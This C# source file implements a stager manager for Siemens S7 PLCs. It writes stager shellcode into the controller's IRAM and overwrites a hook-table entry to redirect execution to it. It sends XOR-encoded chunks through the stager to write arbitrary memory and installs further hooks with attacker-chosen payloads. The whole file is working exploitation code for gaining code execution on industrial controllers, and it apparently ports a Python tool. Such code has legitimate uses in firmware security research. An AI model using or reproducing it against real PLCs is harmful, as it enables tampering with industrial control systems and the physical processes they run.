using System;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace S7.Net
{
    /// <summary>
    /// Manages stager operations for Siemens S7 PLC communication.
    /// Responsible for stager installation, communication, and hook management.
    /// </summary>
    public sealed class PlcStagerManager
    {
        private readonly PlcProtocolHandler _protocolHandler;
        private readonly PlcMemoryManager _memoryManager;
        private readonly Action<string> _log;

        /// <summary>
        /// Initializes a new instance of the PlcStagerManager class.
        /// </summary>
        /// <param name="protocolHandler">The protocol handler to use for communication.</param>
        /// <param name="memoryManager">The memory manager for IRAM operations.</param>
        /// <param name="logger">The logger action.</param>
        /// <exception cref="ArgumentNullException">Thrown when any parameter is null.</exception>
        public PlcStagerManager(PlcProtocolHandler protocolHandler, PlcMemoryManager memoryManager, Action<string> logger)
        {
            _protocolHandler = protocolHandler ?? throw new ArgumentNullException(nameof(protocolHandler));
            _memoryManager = memoryManager ?? throw new ArgumentNullException(nameof(memoryManager));
            _log = logger ?? throw new ArgumentNullException(nameof(logger));
        }

        /// <summary>
        /// Converts a value to big-endian byte array.
        /// </summary>
        /// <param name="value">The value to convert.</param>
        /// <returns>The big-endian byte array.</returns>
        private static byte[] GetBigEndianBytes(uint value)
        {
            var bytes = BitConverter.GetBytes(value);
            if (BitConverter.IsLittleEndian)
            {
                Array.Reverse(bytes);
            }
            return bytes;
        }

        /// <summary>
        /// Installs the stager payload onto the PLC.
        /// </summary>
        /// <param name="stagerPayload">The stager payload to install.</param>
        /// <param name="cancellationToken">The cancellation token.</param>
        public async Task InstallStagerAsync(byte[] stagerPayload, CancellationToken cancellationToken = default)
        {
            _log("Starting stager installation...");
            // 1. Write stager shellcode to its location in IRAM
            await _memoryManager.WriteToIramAsync(PlcConstants.IRAM_STAGER_START, stagerPayload, cancellationToken).ConfigureAwait(false);

            // 2. Overwrite an entry in the hook table to point to our stager
            _log("Overwriting hook table entry...");
            var hookEntryPayload = new byte[6];
            hookEntryPayload[0] = 0x00; // Arg length check part 1
            hookEntryPayload[1] = 0xFF; // Arg length check part 2 (0x00FF = variable length)

            // Pointer to the stager code (big-endian)
            var addrBytes = GetBigEndianBytes(PlcConstants.IRAM_STAGER_START);
            Array.Copy(addrBytes, 0, hookEntryPayload, 2, 4);

            await _memoryManager.WriteToIramAsync(PlcConstants.ADD_HOOK_TABLE_START + 8 * PlcConstants.DEFAULT_STAGER_ADDHOOK_IND + 2, hookEntryPayload, cancellationToken).ConfigureAwait(false);

            _log("Stager installation complete.");
            _log($"[PROTOCOL] ✅ Stager installed at hook index 0x{PlcConstants.DEFAULT_STAGER_ADDHOOK_IND:X2}");
            _log($"[PROTOCOL] Hook table address: 0x{PlcConstants.ADD_HOOK_TABLE_START + 8 * PlcConstants.DEFAULT_STAGER_ADDHOOK_IND + 2:X8}");
            _log($"[PROTOCOL] Stager code address: 0x{PlcConstants.IRAM_STAGER_START:X8}");
            _log("[PROTOCOL] 🎯 Stager is ready for use");
        }

        /// <summary>
        /// Encodes a packet for transmission via the stager.
        /// </summary>
        /// <param name="chunk">The chunk to encode.</param>
        /// <returns>The encoded packet.</returns>
        private static byte[] EncodePacketForStager(byte[] chunk)
        {
            for (int i = 1; i < 256; i++)
            {
                byte key = (byte)i;
                bool keyInChunk = chunk.Contains(key);
                bool keyIsLength = (key == chunk.Length + 2);
                if (!keyInChunk && !keyIsLength)
                {
                    var encoded = new byte[chunk.Length + 1];
                    encoded[0] = key;
                    for (int j = 0; j < chunk.Length; j++)
                    {
                        encoded[j + 1] = (byte)(chunk[j] ^ key);
                    }
                    return encoded;
                }
            }
            throw new Exception("Could not find a suitable XOR key to encode chunk.");
        }

        /// <summary>
        /// Sends a full message via the stager.
        /// </summary>
        /// <param name="msg">The message to send.</param>
        /// <param name="cancellationToken">The cancellation token.</param>
        public async Task SendFullMsgViaStagerAsync(byte[] msg, CancellationToken cancellationToken = default)
        {
            int maxChunkSize = PlcConstants.MAX_MSG_LEN - 1;
            for (int i = 0; i < msg.Length; i += maxChunkSize)
            {
                cancellationToken.ThrowIfCancellationRequested();
                // Add safety delay between chunks (matches Python SEND_REQ_SAFETY_SLEEP_AMT)
                await Task.Delay(10, cancellationToken).ConfigureAwait(false);

                int size = Math.Min(maxChunkSize, msg.Length - i);
                var chunk = new byte[size];
                Array.Copy(msg, i, chunk, 0, size);

                _log($"[BYTES] Send progress: 0x{i:X6}/0x{msg.Length:X6} ({(float)i / msg.Length:P2})");
                var encoded = EncodePacketForStager(chunk);
                _log($"[BYTES] Encoded chunk (with XOR key): {BitConverter.ToString(encoded)}");
                await _protocolHandler.SendPacketAsync(encoded, 8, 10, cancellationToken).ConfigureAwait(false);
                _log($"[BYTES] Chunk sent at offset {i}. Awaiting ACK...");

                var ack = await _protocolHandler.ReceivePacketAsync(cancellationToken).ConfigureAwait(false);
                if (ack == null || ack.Length != 1)
                {
                    _log($"[BYTES][ERROR] Expected single-byte ACK, got: {(ack != null ? BitConverter.ToString(ack) : "<null>")}");
                    throw new Exception($"Did not receive expected empty ACK from stager at chunk offset {i}");
                }

                byte ackValue = ack[0];
                _log($"[BYTES][ACK] Value received: 0x{ackValue:X2}");
                if (ackValue == 0xFF)
                {
                    _log("[BYTES][WARNING] Received interrupt ACK (0xFF). Aborting.");
                    throw new Exception("Interrupt ACK (0xFF)");
                }
            }
            // Send empty packet to signify end of transmission
            var endPacket = EncodePacketForStager(Array.Empty<byte>());
            _log($"[BYTES] Sending end packet: {BitConverter.ToString(endPacket)}");
            await _protocolHandler.SendPacketAsync(endPacket, cancellationToken: cancellationToken).ConfigureAwait(false);
            var finalAck = await _protocolHandler.ReceivePacketAsync(cancellationToken).ConfigureAwait(false);
            _log($"[BYTES] Received end packet ACK (length={finalAck?.Length ?? -1}): {(finalAck != null ? BitConverter.ToString(finalAck) : "<null>")}");
        }

        /// <summary>
        /// Writes data to the PLC via the stager.
        /// </summary>
        /// <param name="address">The address to write to.</param>
        /// <param name="contents">The data to write.</param>
        /// <param name="cancellationToken">The cancellation token.</param>
        public async Task WriteViaStagerAsync(uint address, byte[] contents, CancellationToken cancellationToken = default)
        {
            var addressBytes = GetBigEndianBytes(address);
            await _protocolHandler.InvokeAddHookAsync(PlcConstants.DEFAULT_STAGER_ADDHOOK_IND, addressBytes, false, cancellationToken).ConfigureAwait(false);
            await SendFullMsgViaStagerAsync(contents, cancellationToken).ConfigureAwait(false);
        }

        /// <summary>
        /// Installs an additional hook via the stager.
        /// </summary>
        /// <param name="targetAddress">The target address of the new hook.</param>
        /// <param name="payload">The payload of the new hook.</param>
        /// <param name="newHookNo">The new hook number.</param>
        /// <param name="cancellationToken">The cancellation token.</param>
        public async Task InstallAddHookViaStagerAsync(uint targetAddress, byte[] payload, int newHookNo, CancellationToken cancellationToken = default)
        {
            // Set up function pointer and disable arbitrary argument length check
            var hookEntry = new byte[8];
            hookEntry[3] = 0xff; // Variable length
            hookEntry[4] = (byte)(targetAddress >> 24);
            hookEntry[5] = (byte)(targetAddress >> 16);
            hookEntry[6] = (byte)(targetAddress >> 8);
            hookEntry[7] = (byte)targetAddress;
            await WriteViaStagerAsync(PlcConstants.ADD_HOOK_TABLE_START + (uint)(8 * newHookNo), hookEntry, cancellationToken).ConfigureAwait(false);

            // Write the code of the handler itself
            await WriteViaStagerAsync(targetAddress, payload, cancellationToken).ConfigureAwait(false);
        }
    }
}